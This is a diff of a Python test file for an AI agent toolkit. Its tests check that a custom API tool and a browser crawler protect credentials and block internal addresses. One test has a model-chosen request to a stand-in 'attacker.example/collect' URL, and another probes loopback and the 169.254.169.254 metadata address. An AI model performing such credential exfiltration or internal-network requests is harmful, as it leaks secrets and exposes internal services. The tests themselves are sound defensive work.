@@ -1,23 +1,33 @@
 """Test tool metadata JSON snapshot for dashboard consumption."""
 
+import asyncio
 import contextlib
 import gc
+import gzip
 import inspect
 import json
+import os
+import shutil
 import sys
 import threading
 import weakref
-from collections.abc import Iterator
+from collections.abc import Callable, Iterator
 from dataclasses import replace
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from types import ModuleType, SimpleNamespace
 from typing import Never
 from unittest.mock import AsyncMock
+from urllib.parse import urlsplit
 
 import agno.tools.crawl4ai as agno_crawl4ai
+import httpx
 import pytest
 from agno.tools import Toolkit
+from aiohttp import web
+from crawl4ai.models import CrawlResult, MarkdownGenerationResult
+from playwright.async_api import Error as PlaywrightError
+from playwright.async_api import async_playwright
 
 import mindroom.tool_system.metadata as metadata_module
 
@@ -62,11 +72,15 @@ from mindroom.tool_system.worker_routing import (
     ToolExecutionIdentity,
     resolve_worker_target,
 )
+from mindroom.tools import crawl4ai as crawl4ai_module
 from mindroom.tools.crawl4ai import crawl4ai_tools
 from mindroom.tools.custom_api import custom_api_tools
+from mindroom.worker_computer.browser_proxy import BrowserDestinationProxy, BrowserEgress, _UpstreamProxy
+from tests.browser_egress_helpers import socks5_connect
 
 _BASE_TOOL_REGISTRY = TOOL_REGISTRY.copy()
 _BASE_TOOL_METADATA = TOOL_METADATA.copy()
+_CRAWL4AI_RUNTIME_PATHS = resolve_runtime_paths(config_path=Path("config.yaml"), process_env={})
 
 
 def _restore_builtin_tool_metadata_state() -> None:
@@ -256,60 +270,174 @@ def test_custom_api_tool_rejects_unsafe_url_before_request(
     assert exc_info.value.reason == reason
 
 
-def test_custom_api_tool_filters_sensitive_response_headers(monkeypatch: pytest.MonkeyPatch) -> None:
-    """Custom API output should keep safe response headers without exposing credentials."""
+class _TrackedStream(httpx.SyncByteStream):
+    """A response body that records whether anything read it."""
 
-    class FakeResponse:
-        status_code = 200
-        text = "{}"
-        is_success = True
+    def __init__(self, body: bytes) -> None:
+        self.body = body
+        self.read = False
 
-        def __init__(self) -> None:
-            self.headers = {
-                "content-type": "application/json",
-                "x-request-id": "req-123",
-                "set-cookie": "session=secret",
-                "authorization": "Bearer secret",
-                "proxy-authorization": "Basic secret",
-                "cookie": "session=secret",
-                "www-authenticate": "Bearer challenge",
-                "authentication-info": "nextnonce=secret",
-                "x-api-key": "secret",
-                "x-auth-token": "secret",
-                "x-api-token": "secret",
-                "api-token": "secret",
-                "x-token": "secret",
-                "token": "secret",
-                "x-amz-security-token": "secret",
-                "x_api_token": "secret",
-                "x-ratelimit-remaining-tokens": "99",
-                "x-total-tokens": "100",
-            }
+    def __iter__(self) -> Iterator[bytes]:
+        self.read = True
+        yield self.body
 
-        def json(self) -> dict[str, str]:
-            return {"ok": "true"}
 
-    class FakeClient:
-        def __init__(self, *_args: object, **_kwargs: object) -> None:
-            pass
+def _install_custom_api_transport(
+    monkeypatch: pytest.MonkeyPatch,
+    respond: Callable[[httpx.Request], httpx.Response],
+) -> list[httpx.Request]:
+    """Route custom_api requests to an in-memory handler and record every request it sends."""
+    sent: list[httpx.Request] = []
 
-        def __enter__(self) -> object:
-            return self
-
-        def __exit__(self, *_args: object) -> None:
-            pass
-
-        def request(self, **_kwargs: object) -> FakeResponse:
-            return FakeResponse()
+    def handle(request: httpx.Request) -> httpx.Response:
+        sent.append(request)
+        response = respond(request)
+        if isinstance(response.stream, httpx.ByteStream):
+            # Responses built from bytes are preloaded; a network transport streams its body instead.
+            return httpx.Response(
+                response.status_code,
+                headers=response.headers,
+                stream=_TrackedStream(response.content),
+            )
+        return response
 
     monkeypatch.setattr(custom_api_module, "validate_server_fetch_url", lambda url: url)
-    monkeypatch.setattr(custom_api_module.httpx, "Client", FakeClient)
+    monkeypatch.setattr(custom_api_module, "ServerFetchHTTPTransport", lambda **_kwargs: httpx.MockTransport(handle))
+    return sent
 
-    tool = custom_api_tools()()
 
-    payload = json.loads(tool.make_request("https://example.com/data"))
+@pytest.mark.parametrize(
+    "credentials",
+    [
+        {"api_key": "sk-operator"},
+        {"username": "operator", "password": "operator-password"},
+        {"headers": {"X-Api-Key": "operator-secret"}},
+    ],
+)
+def test_custom_api_tool_refuses_configured_credentials_without_base_url(
+    monkeypatch: pytest.MonkeyPatch,
+    credentials: dict[str, object],
+) -> None:
+    """Configured credentials are never sent to a URL the model chooses."""
+    sent = _install_custom_api_transport(monkeypatch, lambda _request: httpx.Response(200, json={}))
+    tool = custom_api_tools()(**credentials)
 
-    assert payload["headers"] == {
+    payload = json.loads(tool.make_request("https://attacker.example/collect"))
+
+    assert "base_url" in payload["error"]
+    assert sent == []
+
+
+@pytest.mark.parametrize(
+    ("base_url", "location", "keeps_credentials"),
+    [
+        ("https://api.example.com/v1", "https://api.example.com/v1/current", True),
+        ("http://api.example.com/v1", "https://api.example.com/v1/current", True),
+        ("https://api.example.com/v1", "https://cdn.example/object?signature=abc", False),
+        ("https://api.example.com/v1", "http://api.example.com/v1/current", False),
+        ("https://api.example.com/v1", "https://api.example.com:8443/v1/current", False),
+    ],
+)
+def test_custom_api_tool_strips_configured_credentials_from_hops_off_the_base_url_origin(
+    monkeypatch: pytest.MonkeyPatch,
+    base_url: str,
+    location: str,
+    *,
+    keeps_credentials: bool,
+) -> None:
+    """Redirects are followed; only the base_url origin and its direct https upgrade still receive credentials."""
+
+    def respond(request: httpx.Request) -> httpx.Response:
+        if request.url.path == "/v1/start":
+            return httpx.Response(302, headers={"Location": location})
+        return httpx.Response(200, json={"ok": True})
+
+    sent = _install_custom_api_transport(monkeypatch, respond)
+    tool = custom_api_tools()(
+        base_url=base_url,
+        api_key="sk-operator",
+        headers={"X-Api-Key": "operator-secret", "Accept": "application/json"},
+    )
+
+    payload = json.loads(tool.make_request("start", headers={"X-Request-Id": "req-1"}))
+
+    assert payload["data"] == {"ok": True}
+    first, followed = sent
+    assert str(followed.url) == location
+    for request in (first, followed) if keeps_credentials else (first,):
+        assert request.headers["Authorization"] == "Bearer sk-operator"
+        assert request.headers["X-Api-Key"] == "operator-secret"
+    if not keeps_credentials:
+        assert "Authorization" not in followed.headers
+        assert "X-Api-Key" not in followed.headers
+        assert "Accept" not in followed.headers
+    assert followed.headers["X-Request-Id"] == "req-1"
+
+
+def test_custom_api_tool_strips_basic_auth_from_hops_off_the_base_url_origin(monkeypatch: pytest.MonkeyPatch) -> None:
+    """The Basic auth pair reaches the base_url origin but not a presigned download on another host."""
+
+    def respond(request: httpx.Request) -> httpx.Response:
+        if request.url.host == "api.example.com":
+            return httpx.Response(302, headers={"Location": "https://cdn.example/object"})
+        return httpx.Response(200, json={"ok": True})
+
+    sent = _install_custom_api_transport(monkeypatch, respond)
+    tool = custom_api_tools()(base_url="https://api.example.com", username="operator", password="operator-password")  # noqa: S106
+
+    assert json.loads(tool.make_request("download"))["data"] == {"ok": True}
+    assert sent[0].headers["Authorization"].startswith("Basic ")
+    assert [request.url.host for request in sent] == ["api.example.com", "cdn.example"]
+    assert "Authorization" not in sent[1].headers
+
+
+def test_custom_api_tool_without_credentials_follows_redirects_anywhere_public(monkeypatch: pytest.MonkeyPatch) -> None:
+    """An uncredentialed request has nothing to leak, so full URLs and cross-origin redirects keep working."""
+
+    def respond(request: httpx.Request) -> httpx.Response:
+        if request.url.host == "start.example":
+            return httpx.Response(302, headers={"Location": "https://cdn.example/data"})
+        return httpx.Response(200, json={"ok": True})
+
+    sent = _install_custom_api_transport(monkeypatch, respond)
+
+    payload = json.loads(custom_api_tools()().make_request("https://start.example/data"))
+
+    assert payload["data"] == {"ok": True}
+    assert [request.url.host for request in sent] == ["start.example", "cdn.example"]
+
+
+def test_custom_api_tool_filters_sensitive_response_headers(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Custom API output should keep safe response headers without exposing credentials."""
+    response_headers = {
+        "content-type": "application/json",
+        "x-request-id": "req-123",
+        "set-cookie": "session=secret",
+        "authorization": "Bearer secret",
+        "proxy-authorization": "Basic secret",
+        "cookie": "session=secret",
+        "www-authenticate": "Bearer challenge",
+        "authentication-info": "nextnonce=secret",
+        "x-api-key": "secret",
+        "x-auth-token": "secret",
+        "x-api-token": "secret",
+        "api-token": "secret",
+        "x-token": "secret",
+        "token": "secret",
+        "x-amz-security-token": "secret",
+        "x_api_token": "secret",
+        "x-ratelimit-remaining-tokens": "99",
+        "x-total-tokens": "100",
+    }
+    _install_custom_api_transport(
+        monkeypatch,
+        lambda _request: httpx.Response(200, headers=response_headers, content=b'{"ok": "true"}'),
+    )
+
+    payload = json.loads(custom_api_tools()().make_request("https://example.com/data"))
+
+    assert payload["data"] == {"ok": "true"}
+    assert {name: value for name, value in payload["headers"].items() if name != "content-length"} == {
         "content-type": "application/json",
         "x-request-id": "req-123",
         "set-cookie": REDACTED,
@@ -331,6 +459,121 @@ def test_custom_api_tool_filters_sensitive_response_headers(monkeypatch: pytest.
     }
 
 
+def test_custom_api_tool_drops_a_model_host_header_from_credentialed_requests(monkeypatch: pytest.MonkeyPatch) -> None:
+    """The base_url alone picks the virtual host that receives configured credentials, in any header casing."""
+    sent = _install_custom_api_transport(monkeypatch, lambda _request: httpx.Response(200, json={}))
+    tool = custom_api_tools()(base_url="https://api.example.com", api_key="sk-operator")
+
+    tool.make_request("data", headers={"Host": "internal.example", "hOST": "admin.example"})
+
+    assert sent[0].headers.get_list("Host") == ["api.example.com"]
+    assert sent[0].headers["Authorization"] == "Bearer sk-operator"
+
+
+_GZIP_BOMB = gzip.compress(b"\0" * (32 * 1024 * 1024))
+
+
+def test_custom_api_tool_never_inflates_a_compressed_final_response(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Identity is requested even over a model header, and a server that compresses anyway gets an error, not an inflate."""
+    sent = _install_custom_api_transport(
+        monkeypatch,
+        lambda _request: httpx.Response(200, headers={"Content-Encoding": "gzip"}, stream=_TrackedStream(_GZIP_BOMB)),
+    )
+
+    payload = json.loads(
+        custom_api_tools()().make_request("https://example.com/data", headers={"accept-encoding": "br"}),
+    )
+
+    assert sent[0].headers.get_list("Accept-Encoding") == ["identity"]
+    assert payload["status_code"] == 200
+    assert "Content-Encoding gzip" in payload["error"]
+    assert "data" not in payload
+
+
+@pytest.mark.parametrize(
+    ("content_encoding", "refused"),
+    [
+        ("x-gzip", "x-gzip"),
+        ("identity, DEFLATE", "deflate"),
+        ("br", "br"),
+        ("zstd, gzip", "gzip, zstd"),
+        ("none", None),
+        ("utf-8", None),
+        ("binary", None),
+        ("", None),
+    ],
+)
+def test_custom_api_tool_refuses_only_codings_httpx_would_decode(
+    monkeypatch: pytest.MonkeyPatch,
+    content_encoding: str,
+    refused: str | None,
+) -> None:
+    """Each listed coding counts, while tokens HTTPX passes through leave the body readable as plain bytes."""
+    _install_custom_api_transport(
+        monkeypatch,
+        lambda _request: httpx.Response(
+            200,
+            headers={"Content-Encoding": content_encoding},
+            stream=_TrackedStream(b'{"ok": true}'),
+        ),
+    )
+
+    payload = json.loads(custom_api_tools()().make_request("https://example.com/data"))
+
+    if refused is None:
+        assert payload["data"] == {"ok": True}
+        assert "error" not in payload
+    else:
+        assert payload["error"] == f"Response used Content-Encoding {refused} although identity was requested"
+        assert "data" not in payload
+
+
+def test_custom_api_tool_follows_redirects_without_reading_their_bodies(monkeypatch: pytest.MonkeyPatch) -> None:
+    """A compressed redirect body is closed unread, and only the final body is collected."""
+    redirect_body = _TrackedStream(_GZIP_BOMB)
+
+    def respond(request: httpx.Request) -> httpx.Response:
+        if request.url.path == "/start":
+            return httpx.Response(
+                302,
+                headers={"Location": "https://example.com/final", "Content-Encoding": "gzip"},
+                stream=redirect_body,
+            )
+        return httpx.Response(200, json={"ok": True})
+
+    sent = _install_custom_api_transport(monkeypatch, respond)
+
+    payload = json.loads(custom_api_tools()().make_request("https://example.com/start"))
+
+    assert payload["data"] == {"ok": True}
+    assert [request.url.path for request in sent] == ["/start", "/final"]
+    assert redirect_body.read is False
+
+
+def test_custom_api_tool_caps_the_final_body(monkeypatch: pytest.MonkeyPatch) -> None:
+    """An identity body over the cap is reported as an error instead of being buffered whole."""
+    monkeypatch.setattr(custom_api_module, "_MAX_RESPONSE_BYTES", 1024)
+    _install_custom_api_transport(monkeypatch, lambda _request: httpx.Response(200, content=b"x" * 4096))
+
+    payload = json.loads(custom_api_tools()().make_request("https://example.com/large"))
+
+    assert payload["error"] == "Response body exceeds 1024 bytes"
+    assert "data" not in payload
+
+
+def test_custom_api_tool_caps_redirect_hops(monkeypatch: pytest.MonkeyPatch) -> None:
+    """A redirect loop stops after the hop limit."""
+    sent = _install_custom_api_transport(
+        monkeypatch,
+        lambda _request: httpx.Response(302, headers={"Location": "https://example.com/loop"}),
+    )
+
+    payload = json.loads(custom_api_tools()().make_request("https://example.com/loop"))
+
+    assert payload["error"] == "Request failed: more than 10 redirects"
+    assert len(sent) == 11
+
+
 def test_crawl4ai_tool_rejects_private_url_before_crawl(monkeypatch: pytest.MonkeyPatch) -> None:
     """Crawl4AI should reject unsafe URLs before starting browser-backed crawling."""
 
@@ -338,7 +581,7 @@ def test_crawl4ai_tool_rejects_private_url_before_crawl(monkeypatch: pytest.Monk
         msg = "unsafe crawl4ai URL should be rejected before crawling starts"
         raise AssertionError(msg)
 
-    tool = crawl4ai_tools()()
+    tool = crawl4ai_tools()(runtime_paths=_CRAWL4AI_RUNTIME_PATHS)
     monkeypatch.setattr(tool, "_async_crawl", forbidden_crawl)
 
     with pytest.raises(ServerFetchUrlError) as exc_info:
@@ -347,10 +590,107 @@ def test_crawl4ai_tool_rejects_private_url_before_crawl(monkeypatch: pytest.Monk
     assert exc_info.value.reason == "private_address"
 
 
+def _crawl_result(raw_markdown: str, *, fit_markdown: str | None = None) -> CrawlResult:
+    return CrawlResult(
+        url="https://example.com",
+        html=f"<p>{raw_markdown}</p>",
+        success=True,
+        markdown=MarkdownGenerationResult(
+            raw_markdown=raw_markdown,
+            markdown_with_citations=raw_markdown,
+            references_markdown="",
+            fit_markdown=fit_markdown,
+        ),
+    )
+
+
 @pytest.mark.asyncio
-async def test_crawl4ai_tool_installs_server_fetch_route_guard(monkeypatch: pytest.MonkeyPatch) -> None:
-    """Crawl4AI should install a Playwright route guard before crawling."""
+@pytest.mark.parametrize(("fit_markdown", "expected"), [("filtered text", "filtered text"), (None, "raw text")])
+async def test_crawl4ai_returns_filtered_markdown_before_raw_markdown(
+    monkeypatch: pytest.MonkeyPatch,
+    fit_markdown: str | None,
+    expected: str,
+) -> None:
+    """Crawl4AI results expose page text only through their markdown result."""
+
+    class FakeAsyncWebCrawler:
+        def __init__(self, *, config: object) -> None:
+            del config
+            self.crawler_strategy = SimpleNamespace(set_hook=lambda *_args: None)
+
+        async def __aenter__(self) -> object:
+            return self
+
+        async def __aexit__(self, *_args: object) -> None:
+            return None
+
+        async def arun(self, *, url: str, config: object) -> object:
+            del url, config
+            return _crawl_result("raw text", fit_markdown=fit_markdown)
+
+    monkeypatch.setattr(agno_crawl4ai, "AsyncWebCrawler", FakeAsyncWebCrawler)
+
+    assert await crawl4ai_tools()(runtime_paths=_CRAWL4AI_RUNTIME_PATHS)._async_crawl("https://example.com") == expected
+
+
+@pytest.mark.asyncio
+async def test_crawl4ai_context_guard_runs_under_playwright_route_dispatch() -> None:
+    """Playwright's own dispatch reaches the guard, which blocks loopback pages throughout the context."""
+    executable = os.environ.get("MINDROOM_TEST_BROWSER_EXECUTABLE") or shutil.which("chromium")
+    if executable is None:
+        pytest.skip("Chromium required for Playwright route dispatch")
+    hits: list[str] = []
+
+    async def serve(request: web.Request) -> web.Response:
+        hits.append(request.path)
+        return web.Response(text="<title>Internal service</title>", content_type="text/html")
+
+    app = web.Application()
+    app.router.add_get("/{path:.*}", serve)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, "127.0.0.1", 0)
+    tool = crawl4ai_tools()(runtime_paths=_CRAWL4AI_RUNTIME_PATHS)
+    try:
+        await site.start()
+        assert site._server is not None
+        port = site._server.sockets[0].getsockname()[1]
+        async with async_playwright() as playwright:
+            browser = await playwright.chromium.launch(executable_path=executable)
+            try:
+                context = await browser.new_context()
+                page = await context.new_page()
+                await tool._guard_page_context(page, context=context, config=None)
+                popup = await context.new_page()
+                for target in (page, popup):
+                    with pytest.raises(PlaywrightError, match="ERR_BLOCKED_BY_CLIENT"):
+                        await target.goto(f"http://127.0.0.1:{port}/", timeout=10_000)
+            finally:
+                await browser.close()
+    finally:
+        await runner.cleanup()
+    assert hits == []
+
+
+@pytest.mark.asyncio
+async def test_crawl4ai_browser_dials_through_destination_proxy_and_guards_context(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Every Crawl4AI browser connection passes the connect-time relay, and every context page the route guard."""
+    for name in ("all_proxy", "http_proxy", "https_proxy", "no_proxy", "auto_proxy", "socks_server"):
+        monkeypatch.delenv(name, raising=False)
+        monkeypatch.delenv(name.upper(), raising=False)
     installed_hook = None
+    endpoints: list[str] = []
+    loopback_connections = 0
+
+    async def loopback_service(_reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
+        nonlocal loopback_connections
+        loopback_connections += 1
+        writer.close()
+
+    service = await asyncio.start_server(loopback_service, "127.0.0.1", 0)
+    service_port = service.sockets[0].getsockname()[1]
 
     class FakeCrawlerStrategy:
         def set_hook(self, name: str, hook: object) -> None:
@@ -360,7 +700,7 @@ async def test_crawl4ai_tool_installs_server_fetch_route_guard(monkeypatch: pyte
 
     class FakeAsyncWebCrawler:
         def __init__(self, *, config: object) -> None:
-            del config
+            self.config = config
             self.crawler_strategy = FakeCrawlerStrategy()
 
         async def __aenter__(self) -> object:
@@ -372,10 +712,26 @@ async def test_crawl4ai_tool_installs_server_fetch_route_guard(monkeypatch: pyte
         async def arun(self, *, url: str, config: object) -> object:
             del config
             assert url == "https://example.com"
+            proxy_config = self.config.proxy_config
+            assert proxy_config is not None
+            endpoints.append(proxy_config.server)
+            # UDP cannot pass the relay, and no environment switch may let loopback skip it.
+            assert {
+                "--webrtc-ip-handling-policy=disable_non_proxied_udp",
+                "--proxy-bypass-list=<-loopback>",
+            } <= set(self.config.extra_args)
+            for host, port in (("127.0.0.1", service_port), ("169.254.169.254", 80)):
+                _reader, writer, status = await socks5_connect(proxy_config.server, host, port, literal=True)
+                writer.close()
+                await writer.wait_closed()
+                assert status != 0
             assert installed_hook is not None
             page = SimpleNamespace(route=AsyncMock())
-            await installed_hook(page)
-            route_handler = page.route.await_args.args[1]
+            context = SimpleNamespace(route=AsyncMock())
+            await installed_hook(page, context=context, config=None)
+            page.route.assert_not_called()
+            route_pattern, route_handler = context.route.await_args.args
+            assert route_pattern == "**/*"
             unsafe_route = SimpleNamespace(
                 request=SimpleNamespace(url="http://127.0.0.1/admin"),
                 abort=AsyncMock(),
@@ -384,14 +740,104 @@ async def test_crawl4ai_tool_installs_server_fetch_route_guard(monkeypatch: pyte
             await route_handler(unsafe_route)
             unsafe_route.abort.assert_awaited_once_with("blockedbyclient")
             unsafe_route.continue_.assert_not_called()
-            return SimpleNamespace(fit_markdown="", markdown="", text="public content", html="", success=True)
+            return _crawl_result("public content")
 
     monkeypatch.setattr(agno_crawl4ai, "AsyncWebCrawler", FakeAsyncWebCrawler)
-    tool = crawl4ai_tools()()
+    tool = crawl4ai_tools()(runtime_paths=_CRAWL4AI_RUNTIME_PATHS)
 
-    result = await tool._async_crawl("https://example.com")
+    try:
+        result = await tool._async_crawl("https://example.com")
+    finally:
+        service.close()
+        await service.wait_closed()
 
     assert result == "public content"
+    assert loopback_connections == 0
+    assert len(endpoints) == 1
+    endpoint = urlsplit(endpoints[0])
+    assert (endpoint.scheme, endpoint.hostname) == ("socks5", "127.0.0.1")
+    with pytest.raises(ConnectionRefusedError):
+        await asyncio.open_connection(endpoint.hostname, endpoint.port)
+
+
+_UPSTREAM = _UpstreamProxy(host="127.0.0.1", port=3128, tls=False)
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    ("proxy_env", "runner", "expected"),
+    [
+        ({}, False, BrowserEgress()),
+        ({"ALL_PROXY": "http://127.0.0.1:3128"}, False, BrowserEgress(http=_UPSTREAM, https=_UPSTREAM)),
+        (
+            {"HTTP_PROXY": "http://127.0.0.1:3128/"},
+            True,
+            BrowserEgress(http=_UPSTREAM, https=_UPSTREAM, by_hostname=True),
+        ),
+        (
+            {
+                "HTTP_PROXY": "http://127.0.0.1:3128",
+                "HTTPS_PROXY": "http://127.0.0.1:3128",
+                "ALL_PROXY": "socks5://x:1",
+            },
+            False,
+            BrowserEgress(http=_UPSTREAM, https=_UPSTREAM),
+        ),
+        ({"HTTP_PROXY": "http://one:3128", "HTTPS_PROXY": "http://two:3128"}, True, None),
+    ],
+)
+async def test_crawl4ai_browser_egress_route(
+    monkeypatch: pytest.MonkeyPatch,
+    proxy_env: dict[str, str],
+    runner: bool,
+    expected: BrowserEgress | None,
+) -> None:
+    """Crawl4AI's relay chains the operator egress proxy, and a runner refuses an ambiguous one."""
+    for name in ("all_proxy", "http_proxy", "https_proxy", "no_proxy", "auto_proxy", "socks_server"):
+        monkeypatch.delenv(name, raising=False)
+        monkeypatch.delenv(name.upper(), raising=False)
+    for name, value in proxy_env.items():
+        monkeypatch.setenv(name, value)
+    servers: list[str] = []
+    relays: list[BrowserDestinationProxy] = []
+
+    class RecordingRelay(BrowserDestinationProxy):
+        def __init__(self, **kwargs: BrowserEgress) -> None:
+            super().__init__(**kwargs)
+            relays.append(self)
+
+    class FakeAsyncWebCrawler:
+        def __init__(self, *, config: object) -> None:
+            servers.append(config.proxy_config.server)
+            self.crawler_strategy = SimpleNamespace(set_hook=lambda *_args: None)
+
+        async def __aenter__(self) -> object:
+            return self
+
+        async def __aexit__(self, *_args: object) -> None:
+            return None
+
+        async def arun(self, *, url: str, config: object) -> object:
+            del url, config
+            return _crawl_result("public content")
+
+    monkeypatch.setattr(agno_crawl4ai, "AsyncWebCrawler", FakeAsyncWebCrawler)
+    monkeypatch.setattr(crawl4ai_module, "BrowserDestinationProxy", RecordingRelay)
+    runtime_paths = resolve_runtime_paths(
+        config_path=Path("config.yaml"),
+        process_env={"MINDROOM_SANDBOX_RUNNER_MODE": "true"} if runner else {},
+    )
+
+    result = await crawl4ai_tools()(runtime_paths=runtime_paths)._async_crawl("https://example.com")
+
+    if expected is None:
+        assert "cannot choose one egress proxy" in result
+        assert servers == []
+    else:
+        assert result == "public content"
+        assert len(relays) == 1
+        assert servers == [relays[0].endpoint]
+        assert relays[0]._egress == expected
 
 
 # Research toolkits whose URL functions download pages from the MindRoom process through the server-fetch guard.
@@ -484,11 +930,16 @@ def test_research_url_tools_declare_their_fetch_path() -> None:
         ),
     ],
 )
-def test_local_url_fetch_tools_do_not_contact_loopback_targets(tool_name: str) -> None:
+def test_local_url_fetch_tools_do_not_contact_loopback_targets(tool_name: str, tmp_path: Path) -> None:
     """Local page fetchers must refuse loopback targets before connecting unless they default to a worker."""
     if BUILTIN_TOOL_METADATA[tool_name].default_execution_target is ToolExecutionTarget.WORKER:
         pytest.skip("Worker execution keeps downloads behind the worker egress policy.")
-    toolkit = BUILTIN_TOOL_REGISTRY[tool_name]()()
+    toolkit = get_tool_by_name(
+        tool_name,
+        resolve_runtime_paths(config_path=tmp_path / "config.yaml", storage_path=tmp_path / "storage"),
+        disable_sandbox_proxy=True,
+        worker_target=None,
+    )
 
     with _recording_loopback_server() as (url, connections):
         for function_name, parameter in _url_functions(tool_name):
@@ -1099,6 +1550,55 @@ def test_script_integral_number_overrides_reach_integer_limits(tmp_path: Path) -
 
     assert tool.limits.max_concurrent_runs == 3
     assert tool.limits.max_tool_calls_per_minute == 30
+
+
+@pytest.mark.parametrize(
+    ("stored", "expected"),
+    [
+        ("false", False),
+        ("true", True),
+        (False, False),
+        (True, True),
+    ],
+)
+def test_stored_boolean_tool_config_reaches_constructor_as_boolean(
+    tmp_path: Path,
+    stored: object,
+    expected: bool,
+) -> None:
+    """Credential seeds resolve to strings, so a stored "false" must not enable a boolean option."""
+    runtime_paths = resolve_runtime_paths(
+        config_path=tmp_path / "config.yaml",
+        storage_path=tmp_path / "storage",
+    )
+
+    tool = get_tool_by_name(
+        "browser",
+        runtime_paths,
+        credential_overrides={"allow_private_networks": stored},
+        disable_sandbox_proxy=True,
+        worker_target=None,
+    )
+
+    assert tool._allow_private_networks is expected
+
+
+@pytest.mark.parametrize("stored", ["maybe", "", "False", " true", "1", "no", 1, 0.0, ["true"]])
+def test_stored_boolean_tool_config_rejects_non_boolean_values(tmp_path: Path, stored: object) -> None:
+    """Unrecognized stored values for a boolean option fail instead of silently choosing a truthiness."""
+    runtime_paths = resolve_runtime_paths(
+        config_path=tmp_path / "config.yaml",
+        storage_path=tmp_path / "storage",
+    )
+
+    with pytest.raises(ToolConfigOverrideError, match=r"'browser\.allow_private_networks' must be a boolean"):
+        get_tool_by_name(
+            "browser",
+            runtime_paths,
+            credential_overrides={"allow_private_networks": stored},
+            disable_sandbox_proxy=True,
+            worker_target=None,
+        )
 
 
 def test_custom_toolkit_exclude_tools_override_filters_async_functions(tmp_path: Path) -> None:
